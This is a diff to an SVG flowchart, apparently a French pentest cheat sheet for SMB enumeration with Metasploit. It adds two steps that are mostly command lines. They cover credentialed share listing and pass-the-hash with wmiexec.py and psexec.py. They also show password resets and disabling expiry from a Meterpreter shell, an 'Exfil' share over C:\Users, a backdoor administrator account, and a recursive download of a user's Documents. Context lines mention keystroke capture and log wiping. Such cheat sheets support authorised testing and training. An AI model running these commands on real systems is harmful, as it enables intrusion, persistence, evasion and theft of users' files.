@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<svg width="1890" height="5820" viewBox="0 0 1890 5820"
+<svg width="1890" height="6650" viewBox="0 0 1890 6650"
      xmlns="http://www.w3.org/2000/svg">
 <defs>
   <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto" fill="#484f58">
     <polygon points="0 0, 10 3.5, 0 7" />
   </marker>
 </defs>
-<rect width="1890" height="5820" fill="#0d1117"/>
+<rect width="1890" height="6650" fill="#0d1117"/>
 <text x="945.0" y="28" text-anchor="middle" font-family="Segoe UI, sans-serif"
       font-size="13" font-weight="bold" fill="#8b949e">SMB ENUMERATION — METASPLOIT FRAMEWORK EDITION</text>
 
@@ -490,6 +490,60 @@
 <text x="686" y="5707" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 keyscan_dump pour récupérer les frappes clavier.</text>
 <text x="686" y="5727" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 clearev pour nettoyer les logs (attention, suspect !).</text>
 
+<!-- ═══ STEP 15: VALIDER ACCES SMB (KALI) ═══ -->
+<rect x="673" y="5813" width="540" height="290" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="5810" width="540" height="290" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="670" y="5810" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="670" y="5838" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1139.0" y="5818" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="1169.5" y="5832" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="686" y="5834" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">15. Valider Accès SMB (Kali)</text>
+<rect x="686" y="5858" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="5874" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Lister partages avec credentials :</text>
+<text x="694" y="5890" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">smbclient -L //&lt;IP&gt; -U &lt;USER&gt;%&lt;PASS&gt;</text>
+<text x="694" y="5906" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">crackmapexec smb &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASS&gt; --shares</text>
+<text x="694" y="5922" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">crackmapexec smb &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASS&gt; --users</text>
+<text x="694" y="5938" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">smbmap -H &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASS&gt;</text>
+<rect x="686" y="5954" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="5970" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Erreurs fréquentes :</text>
+<text x="694" y="5986" font-family="Consolas, Courier New, monospace" font-size="12" fill="#da3633"># NT_STATUS_PASSWORD_EXPIRED → MDP expiré</text>
+<text x="694" y="6002" font-family="Consolas, Courier New, monospace" font-size="12" fill="#da3633"># NT_STATUS_ACCESS_DENIED → C$/ADMIN$ refusés</text>
+<text x="694" y="6018" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># signing:False → vulnérable relay attacks</text>
+<text x="686" y="6042" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 C$/ADMIN$ refusés malgré admin group → voir step 16.</text>
+<text x="686" y="6062" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 crackmapexec --shares affiche READ/WRITE par share.</text>
+
+<!-- ═══ STEP 16: CONTOURNEMENTS ACCES SMB ═══ -->
+<rect x="673" y="6143" width="540" height="450" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="6140" width="540" height="450" rx="8" fill="#0d1117" stroke="#d29922" stroke-width="2"/>
+<rect x="670" y="6140" width="540" height="36" rx="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="670" y="6168" width="540" height="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="1112.0" y="6148" width="88.0" height="20" rx="4" fill="#d29922" fill-opacity="0.3"/>
+<text x="1156.0" y="6162" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#d29922">FALLBACK</text>
+<text x="686" y="6164" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">16. Contournements Accès SMB</text>
+<rect x="686" y="6188" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="6204" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># PASSWORD_EXPIRED → reset depuis Meterpreter :</text>
+<text x="694" y="6220" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; shell</text>
+<text x="694" y="6236" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">net user &lt;USER&gt; NouveauMDP123!</text>
+<text x="694" y="6252" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">net accounts /maxpwage:unlimited</text>
+<rect x="686" y="6268" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="6284" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Pass-the-Hash (contourne expiration) :</text>
+<text x="694" y="6300" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">smbclient //&lt;IP&gt;/C$ -U &lt;USER&gt;%&lt;HASH&gt; --pw-nt-hash</text>
+<text x="694" y="6316" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">crackmapexec smb &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTLM&gt;</text>
+<text x="694" y="6332" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">wmiexec.py &lt;USER&gt;@&lt;IP&gt; -hashes &lt;LM&gt;:&lt;NTLM&gt;</text>
+<text x="694" y="6348" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">psexec.py &lt;USER&gt;@&lt;IP&gt; -hashes &lt;LM&gt;:&lt;NTLM&gt;</text>
+<rect x="686" y="6364" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="6380" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Créer partage personnalisé (shell SYSTEM) :</text>
+<text x="694" y="6396" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">net share Exfil=C:\Users /grant:&lt;USER&gt;,FULL</text>
+<text x="694" y="6412" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Créer compte backdoor :</text>
+<text x="694" y="6428" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">net user backup Pass123! /add</text>
+<text x="694" y="6444" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">net localgroup administrators backup /add</text>
+<rect x="686" y="6460" width="500" height="56" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="6476" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Dernier recours → Meterpreter directement :</text>
+<text x="694" y="6492" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; download -r C:\\Users\\&lt;USER&gt;\\Documents</text>
+<text x="694" y="6508" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">meterpreter &gt; shell</text>
+<text x="686" y="6532" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 wmiexec.py contourne souvent les restrictions SMB.</text>
+<text x="686" y="6552" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 Toujours tester PtH si le MDP en clair échoue.</text>
+
 <!-- ═══ ARROWS ═══ -->
 <path d="M 940.0 215 L 940.0 244" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
 <path d="M 940.0 549 L 940.0 578" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
@@ -553,5 +607,7 @@
 <path d="M 940.0 4605 L 940.0 4634" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
 <path d="M 940.0 5000 L 940.0 5034" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
 <path d="M 940.0 5355 L 940.0 5389" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 940.0 5770 L 940.0 5804" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
+<path d="M 940.0 6100 L 940.0 6134" stroke="#484f58" stroke-width="2" fill="none" marker-end="url(#arrowhead)"/>
 
 </svg>
